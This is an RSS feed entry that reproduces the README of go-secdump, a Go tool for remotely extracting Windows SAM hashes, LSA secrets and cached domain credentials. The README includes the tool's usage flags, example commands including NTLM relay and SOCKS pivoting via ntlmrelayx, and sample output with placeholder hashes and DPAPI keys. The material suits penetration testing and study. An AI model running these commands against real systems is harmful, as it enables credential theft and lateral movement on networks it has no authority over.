<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-02-16T01:28:07Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>jfjallid/go-secdump</title>
    <updated>2024-02-16T01:28:07Z</updated>
    <id>tag:github.com,2024-02-16:/jfjallid/go-secdump</id>
    <link href="https://github.com/jfjallid/go-secdump" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Tool to remotely dump secrets from the Windows registry&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;go-secdump&lt;/h1&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;Package go-secdump is a tool built to remotely extract hashes from the SAM registry hive as well as LSA secrets and cached hashes from the SECURITY hive without any remote agent and without touching disk.&lt;/p&gt; &#xA;&lt;p&gt;The tool is built on top of the library &lt;a href=&#34;https://github.com/jfjallid/go-smb&#34;&gt;go-smb&lt;/a&gt; and use it to communicate with the Windows Remote Registry to retrieve registry keys directly from memory.&lt;/p&gt; &#xA;&lt;p&gt;It was built as a learning experience and as a proof of concept that it should be possible to remotely retrieve the NT Hashes from the SAM hive and the LSA secrets as well as domain cached credentials without having to first save the registry hives to disk and then parse them locally.&lt;/p&gt; &#xA;&lt;p&gt;The main problem to overcome was that the SAM and SECURITY hives are only readable by NT AUTHORITY\SYSTEM. However, I noticed that the local group administrators had the WriteDACL permission on the registry hives and could thus be used to temporarily grant read access to itself to retrieve the secrets and then restore the original permissions.&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;p&gt;Much of the code in this project is inspired/taken from Impacket&#39;s secdump but converted to access the Windows registry remotely and to only access the required registry keys.&lt;/p&gt; &#xA;&lt;p&gt;Some of the other sources that have been useful to understanding the registry structure and encryption methods are listed below:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.passcape.com/index.php?section=docsys&amp;amp;cmd=details&amp;amp;id=23&#34;&gt;https://www.passcape.com/index.php?section=docsys&amp;amp;cmd=details&amp;amp;id=23&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.beginningtoseethelight.org/ntsecurity/index.htm&#34;&gt;http://www.beginningtoseethelight.org/ntsecurity/index.htm&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://social.technet.microsoft.com/Forums/en-US/6e3c4486-f3a1-4d4e-9f5c-bdacdb245cfd/how-are-ntlm-hashes-stored-under-the-v-key-in-the-sam?forum=win10itprogeneral&#34;&gt;https://social.technet.microsoft.com/Forums/en-US/6e3c4486-f3a1-4d4e-9f5c-bdacdb245cfd/how-are-ntlm-hashes-stored-under-the-v-key-in-the-sam?forum=win10itprogeneral&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: ./go-secdump [options]&#xA;&#xA;options:&#xA;      --host &amp;lt;target&amp;gt;       Hostname or ip address of remote server&#xA;  -P, --port &amp;lt;port&amp;gt;         SMB Port (default 445)&#xA;  -d, --domain &amp;lt;domain&amp;gt;     Domain name to use for login&#xA;  -u, --user &amp;lt;username&amp;gt;     Username&#xA;  -p, --pass &amp;lt;pass&amp;gt;         Password&#xA;  -n, --no-pass             Disable password prompt and send no credentials&#xA;      --hash &amp;lt;NT Hash&amp;gt;      Hex encoded NT Hash for user password&#xA;      --local               Authenticate as a local user instead of domain user&#xA;      --dump                Saves the SAM and SECURITY hives to disk and&#xA;                            transfers them to the local machine.&#xA;      --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.&#xA;      --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.&#xA;      --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.&#xA;      --backup-dacl         Save original DACLs to disk before modification&#xA;      --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.&#xA;      --backup-file         Filename for DACL backup (default dacl.backup)&#xA;      --relay               Start an SMB listener that will relay incoming&#xA;                            NTLM authentications to the remote server and&#xA;                            use that connection. NOTE that this forces SMB 2.1&#xA;                            without encryption.&#xA;      --relay-port &amp;lt;port&amp;gt;   Listening port for relay (default 445)&#xA;      --socks-host &amp;lt;target&amp;gt; Establish connection via a SOCKS5 proxy server&#xA;      --socks-port &amp;lt;port&amp;gt;   SOCKS5 proxy port (default 1080)&#xA;  -t, --timeout             Dial timeout in seconds (default 5)&#xA;      --noenc               Disable smb encryption&#xA;      --smb2                Force smb 2.1&#xA;      --debug               Enable debug logging&#xA;      --verbose             Enable verbose logging&#xA;  -o, --output              Filename for writing results (default is stdout). Will append to file if it exists.&#xA;  -v, --version             Show version&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Changing DACLs&lt;/h2&gt; &#xA;&lt;p&gt;go-secdump will automatically try to modify and then restore the DACLs of the required registry keys. However, if something goes wrong during the restoration part such as a network disconnect or other interrupt, the remote registry will be left with the modified DACLs.&lt;/p&gt; &#xA;&lt;p&gt;Using the &lt;code&gt;--backup-dacl&lt;/code&gt; argument it is possible to store a serialized copy of the original DACLs before modification. If a connectivity problem occurs, the DACLs can later be restored from file using the &lt;code&gt;--restore-dacl&lt;/code&gt; argument.&lt;/p&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;p&gt;Dump all registry secrets&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local&#xA;or&#xA;./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Dump only SAM, LSA, or DCC2 cache secrets&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam&#xA;./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa&#xA;./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;NTLM Relaying&lt;/h3&gt; &#xA;&lt;p&gt;Dump registry secrets using NTLM relaying&lt;/p&gt; &#xA;&lt;p&gt;Start listener&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./go-secdump --host 192.168.0.100 -n --relay&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Trigger an auth to your machine from a client with administrative access to 192.168.0.100 somehow and then wait for the dumped secrets.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;YYYY/MM/DD HH:MM:SS smb [Notice] Client connected from 192.168.0.30:49805&#xA;YYYY/MM/DD HH:MM:SS smb [Notice] Client (192.168.0.30:49805) successfully authenticated as (domain.local\Administrator) against (192.168.0.100:445)!&#xA;Net-NTLMv2 Hash: Administrator::domain.local:34f4533b697afc39:b4dcafebabedd12deadbeeffef1cea36:010100000deadbeef59d13adc22dda0&#xA;2023/12/13 14:47:28 [Notice] [+] Signing is NOT required&#xA;2023/12/13 14:47:28 [Notice] [+] Login successful as domain.local\Administrator&#xA;[*] Dumping local SAM hashes&#xA;Name: Administrator&#xA;RID: 500&#xA;NT: 2727D7906A776A77B34D0430EAACD2C5&#xA;&#xA;Name: Guest&#xA;RID: 501&#xA;NT: &amp;lt;empty&amp;gt;&#xA;&#xA;Name: DefaultAccount&#xA;RID: 503&#xA;NT: &amp;lt;empty&amp;gt;&#xA;&#xA;Name: WDAGUtilityAccount&#xA;RID: 504&#xA;NT: &amp;lt;empty&amp;gt;&#xA;&#xA;[*] Dumping LSA Secrets&#xA;[*] $MACHINE.ACC&#xA;$MACHINE.ACC: 0x15deadbeef645e75b38a50a52bdb67b4&#xA;$MACHINE.ACC:plain_password_hex:47331e26f48208a7807cafeababe267261f79fdc38c740b3bdeadbeef7277d696bcafebabea62bb5247ac63be764401adeadbeef4563cafebabe43692deadbeef03f...&#xA;[*] DPAPI_SYSTEM&#xA;dpapi_machinekey: 0x8afa12897d53deadbeefbd82593f6df04de9c100&#xA;dpapi_userkey: 0x706e1cdea9a8a58cafebabe4a34e23bc5efa8939&#xA;[*] NL$KM&#xA;NL$KM: 0x53aa4b3d0deadbeef42f01ef138c6a74&#xA;[*] Dumping cached domain credentials (domain/username:hash)&#xA;DOMAIN.LOCAL/Administrator:$DCC2$10240#Administrator#97070d085deadbeef22cafebabedd1ab&#xA;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;SOCKS Proxy&lt;/h3&gt; &#xA;&lt;p&gt;Dump secrets using an upstream SOCKS5 proxy either for pivoting or to take advantage of Impacket&#39;s ntlmrelayx.py SOCKS server functionality.&lt;/p&gt; &#xA;&lt;p&gt;When using ntlmrelayx.py as the upstream proxy, the provided username must match that of the authenticated client, but the password can be empty.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./ntlmrelayx.py -socks -t 192.168.0.100 -smb2support --no-http-server --no-wcf-server --no-raw-server&#xA;...&#xA;&#xA;./go-secdump --host 192.168.0.100 --user Administrator -n --socks-host 127.0.0.1 --socks-port 1080&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>